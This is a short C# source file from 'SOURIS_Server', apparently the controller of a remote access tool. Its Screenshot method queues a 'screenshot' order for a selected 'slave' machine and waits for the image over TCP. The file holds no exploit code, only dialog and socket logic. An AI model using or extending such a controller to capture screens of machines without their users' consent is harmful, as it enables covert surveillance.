using MahApps.Metro.Controls.Dialogs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Threading;

namespace SOURIS_Server.Slaves
{
    class SlaveFunc
    {
        public static async void Screenshot(int SlaveID)
        {
            try
            {
                Task.Factory.StartNew(() => { Sockets.TCPServer.ListenScreenshot(); });
                Sockets.TCPServer.waitingforscreenshot = true;
                Sockets.SocketServer.WaitForInteract = true;
                ProgressDialogController controller = await MainWindow.main.ShowProgressAsync("Screenshooting Slave...", "Sending a request to the slave...");
                controller.Minimum = 1;
                controller.Maximum = 100;
                SlaveList.List[SlaveID].NextOrder = "screenshot";
                controller.SetMessage("Waiting for the screenshot...");
                controller.SetProgress(40);
                controller.SetMessage("Receiving screenshot...");
                await Task.Delay(250);
                await controller.CloseAsync().ConfigureAwait(false);

            }
            catch (Exception e)
            {
                Form.FormUpdate.addlistbox(e.ToString());
            }
        }
    }
}
